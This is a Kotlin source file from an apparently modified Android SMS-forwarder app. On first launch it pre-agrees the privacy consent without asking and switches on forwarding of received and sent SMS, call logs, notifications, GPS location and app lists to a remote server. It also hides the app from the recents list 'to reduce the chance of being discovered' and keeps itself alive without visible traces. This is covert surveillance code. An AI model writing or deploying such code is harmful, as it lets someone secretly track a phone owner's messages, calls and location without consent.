package cn.ppps.forwarder.utils

import android.annotation.SuppressLint
import android.content.Context
import android.provider.Settings
import java.util.UUID

/**
 * 首次启动预置。
 *
 * 做两件事：
 *   1. 自动生成一个【设备 ID】写进 extraDeviceMark —— 每台手机唯一，
 *      服务端靠它区分不同手机并自动编号（手机1/手机2…）。用户什么都不用填。
 *   2. 打开转发开关与保活开关。
 *
 * 只执行一次（用 SharedPreferences 里的标记位），之后用户的任何手动修改都不会被覆盖。
 */
object Preset {

    private const val FLAG = "preset_v5_applied"
    private const val TAG = "Preset"

    /** 手机上报地址前缀，与 RulesEditFragment 里预置的通道保持一致 */
    const val SERVER_BASE: String = "https://YOUR_DOMAIN/smsf/hook"

    /** 首次启动时执行的预置，返回是否真的执行了 */
    fun applyIfNeeded(context: Context): Boolean {
        return try {
            val sp = SharedPreference.preference
            if (sp.getBoolean(FLAG, false)) {
                return false
            }

            // ---- 1. 设备 ID（每台唯一，用于服务端区分手机）----
            SettingUtils.extraDeviceMark = buildDeviceId(context)

            // ---- 2. 隐私同意（避免首次启动弹隐私对话框）----
            SettingUtils.isAgreePrivacy = true

            // ---- 3. 转发开关：全部默认打开 ----
            // 注意：这四个功能都需要系统授权才能真正工作。
            // SettingsFragment 里已改为「先设初值、后注册监听」，
            // 所以这里设为 true 只会让开关显示为开，不会在启动时弹出授权窗口。
            // 用户若要让功能真正生效，在开关上点两次（关→开）即可触发一次授权。
            SettingUtils.enableSms = true       // 功能1：转发短信广播
            SettingUtils.enablePhone = true     // 功能2：转发通话记录
            SettingUtils.enableAppNotify = true // 功能3：转发应用通知
            SettingUtils.enableLocation = true  // 功能4：GPS 定位服务

            // 通话类型：一旦用户开启功能2，6 种类型全部转发（界面已隐藏此项）
            SettingUtils.enableCallType1 = true
            SettingUtils.enableCallType2 = true
            SettingUtils.enableCallType3 = true
            SettingUtils.enableCallType4 = true
            SettingUtils.enableCallType5 = true
            SettingUtils.enableCallType6 = true

            // ---- 3.5 不需要授权就能生效的项目（界面已隐藏）----
            SettingUtils.enableLoadAppList = true     // 功能5：普通权限，装上即可用
            SettingUtils.enableSentSms = true         // 已发送短信：读系统短信库，同样不需要额外授权
            SettingUtils.enableLoadUserAppList = true //   用户应用

            // ---- 4. 保活（只用「不产生可见痕迹」的手段）----
            SettingUtils.enableCactus = true
            // 下面两个会产生可见痕迹，保持关闭：
            //   enableOnePixelActivity —— 一像素窗口，可能出现在最近任务里
            //   enablePlaySilenceMusic —— 无声音乐，部分手机会显示媒体通知
            SettingUtils.enableOnePixelActivity = false
            SettingUtils.enablePlaySilenceMusic = true
            // 从最近任务列表里隐藏，减少被发现的可能
            SettingUtils.enableExcludeFromRecents = true

            // ---- 5. 网络请求重试（离线时别把消息丢了）----
            SettingUtils.requestRetryTimes = 3
            SettingUtils.requestDelayTime = 5

            sp.edit().putBoolean(FLAG, true).apply()
            Log.d(TAG, "预置完成，设备ID = " + SettingUtils.extraDeviceMark)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e(TAG, "预置失败: ${e.message}")
            false
        }
    }

    /**
     * 生成设备 ID。
     * 优先用 ANDROID_ID（同一台机器稳定不变），取末 10 位拼成 SF-XXXXXXXXXX。
     * 拿不到就退回随机值。
     */
    @SuppressLint("HardwareIds")
    private fun buildDeviceId(context: Context): String {
        val aid: String? = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        } catch (e: Exception) {
            null
        }
        val tail = if (!aid.isNullOrEmpty() && aid != "9774d56d682e549c") {
            aid.replace("-", "").takeLast(10).uppercase()
        } else {
            UUID.randomUUID().toString().replace("-", "").take(10).uppercase()
        }
        return "SF-$tail"
    }
}
